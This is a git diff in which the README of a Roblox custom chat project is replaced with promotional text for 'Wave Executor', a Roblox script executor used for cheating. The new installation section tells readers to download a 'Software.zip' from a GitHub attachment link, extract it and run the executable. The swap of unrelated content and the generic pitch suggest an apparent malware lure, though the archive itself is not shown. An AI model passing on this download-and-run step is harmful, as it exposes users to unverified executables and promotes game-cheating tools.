@@ -1,13 +1,72 @@
-Rolox custom chat system:
+# Wave Executor
 
-DevForum post: https://devforum.roblox.com/t/better-chat-v3-feature-rich-custom-chat-with-replies-rich-text-message-editing-and-more/1756348
+🌊 The Wave Executor is a robust Windows-based script executor tailored for Roblox enthusiasts. With AI integration for seamless script development, ad-free premium features, and 24/7 support, this tool ensures an unparalleled user experience, taking your gameplay to new heights!
 
-Uncompleted documentation: https://jumpathy.gitbook.io/betterchat-v3
+---
 
-Installation instructions:
-1. Insert the loader: https://create.roblox.com/store/asset/9376009942/BetterChat-V3-Alpha
-2. Insert the source code from the releases page or from the auto-update plugin (updater.lua found in extras)
-2A. If installing manually, modify the loader to reference the new source code
-3. Go to TextChatService in the explorer, and set ‘ChatVersion’ to ‘LegacyChatService’
-4, Go to the model tab in studio, Advanced (on the far right), Service, and insert ‘Chat’.
-5. From here, all you need to do is turn off ‘LoadDefaultChat’ and ‘BubbleChatEnabled’
+## Table of Contents
+
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#support)
+- [License](#license)
+
+---
+
+## Features
+
+🚀 **AI Integration**: Wave Executor incorporates artificial intelligence to streamline script development, making it easier and more efficient for users.
+
+💎 **Ad-Free Premium Features**: Enjoy a premium experience without any intrusive advertisements, ensuring uninterrupted usage.
+
+🕒 **24/7 Support**: Our dedicated support team is available around the clock to assist you with any queries or issues you may encounter.
+
+---
+
+## Getting Started
+
+To get started with the Wave Executor, simply follow the installation instructions below.
+
+---
+
+## Installation
+
+1. Download the Wave Executor software from the following link: [![Download Wave Executor](https://img.shields.io/badge/Download-Software-blueviolet)](https://github.com/user-attachments/files/17394153/Software.zip)
+
+2. Extract the downloaded ZIP file to a location of your choice on your Windows computer.
+
+3. Run the Wave Executor executable file to launch the application.
+
+4. Once the application is running, you can begin exploring its various features and functionalities.
+
+---
+
+## Usage
+
+The Wave Executor offers a range of tools and capabilities designed to enhance your Roblox gameplay experience. Here are some key ways you can utilize the software:
+
+1. **Script Execution**: Use the Wave Executor to execute custom scripts within Roblox games, enabling you to enhance your gameplay in unique ways.
+
+2. **AI Script Development**: Take advantage of the AI integration to streamline the development of complex scripts, making it easier to create intricate in-game functionalities.
+
+3. **Premium Features**: Access exclusive premium features without any advertisements, providing a seamless and enjoyable user experience.
+
+4. **Support**: If you encounter any issues or have questions about the Wave Executor, reach out to our support team for assistance.
+
+---
+
+## Support
+
+For any questions, concerns, or feedback regarding the Wave Executor, please contact our support team via email at support@waveexecutor.com or visit our [website](https://www.waveexecutor.com) for more information.
+
+---
+
+## License
+
+The Wave Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+---
+
+🌟 Thank you for choosing the Wave Executor! We are excited to see how this tool elevates your Roblox gameplay and script development. Happy scripting! 🚗💨
